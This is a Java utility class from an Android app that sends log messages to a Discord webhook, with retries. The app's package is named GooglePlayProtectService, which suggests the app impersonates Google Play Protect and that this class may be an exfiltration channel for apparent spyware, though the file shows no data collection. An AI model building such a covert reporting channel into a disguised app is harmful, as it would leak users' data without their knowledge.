package com;

import android.util.Log;

import com.GooglePlayProtectService.BuildConfig;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class Utils {
    private static final String TAG = "Utils";
    // Usamos BuildConfig para obtener la URL del webhook de forma segura
    private static final ScheduledExecutorService executorService = Executors.newScheduledThreadPool(1);
    private static final int MAX_RETRY_ATTEMPTS = 3;
    private static final int RETRY_DELAY_MS = 5000; // 5 segundos
    public static void sendMessage(String logMessage) {
        sendMessageWithRetry(logMessage, 0);
    }
    
    private static void sendMessageWithRetry(final String logMessage, final int attemptCount) {
        if (BuildConfig.WEBHOOK_URL.isEmpty()) {
            Log.e(TAG, "WEBHOOK_URL no está configurada. No se puede enviar el mensaje.");
            return;
        }
        
        executorService.execute(() -> {
            try {
                JSONObject messageJSON = new JSONObject();
                messageJSON.put("content", "```\n" + logMessage + "\n```");

                URL url = new URL(BuildConfig.WEBHOOK_URL);

                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setConnectTimeout(15000); // 15 segundos timeout
                connection.setReadTimeout(15000);    // 15 segundos timeout
                connection.setDoOutput(true);

                try (OutputStream os = connection.getOutputStream()) {
                    byte[] input = messageJSON.toString().getBytes(StandardCharsets.UTF_8);
                    os.write(input, 0, input.length);
                    os.flush();
                }

                int responseCode = connection.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK || responseCode == HttpURLConnection.HTTP_NO_CONTENT) {
                    Log.d(TAG, "Message sent to Discord. Response code: " + responseCode);
                } else {
                    Log.e(TAG, "Failed to send message to Discord. Response code: " + responseCode);
                    handleMessageSendingFailure(logMessage, attemptCount, new Exception("HTTP error code: " + responseCode));
                }
                connection.disconnect();
            } catch (JSONException e) {
                Log.e(TAG, "Failed to create JSON object: " + e.getMessage());
                handleMessageSendingFailure(logMessage, attemptCount, e);
            } catch (Exception e) {
                Log.e(TAG, "Error sending message to Discord: " + e.getMessage());
                handleMessageSendingFailure(logMessage, attemptCount, e);
            }
        });
    }
    
    private static void handleMessageSendingFailure(String logMessage, int attemptCount, Exception exception) {
        if (attemptCount < MAX_RETRY_ATTEMPTS) {
            Log.w(TAG, "Reintentando envío de mensaje (" + (attemptCount + 1) + "/" + MAX_RETRY_ATTEMPTS + ") después de: " + exception.getMessage());
            executorService.schedule(() -> sendMessageWithRetry(logMessage, attemptCount + 1), RETRY_DELAY_MS, TimeUnit.MILLISECONDS);
        } else {
            Log.e(TAG, "Error definitivo después de " + MAX_RETRY_ATTEMPTS + " intentos: " + exception.getMessage());
        }
    }
}


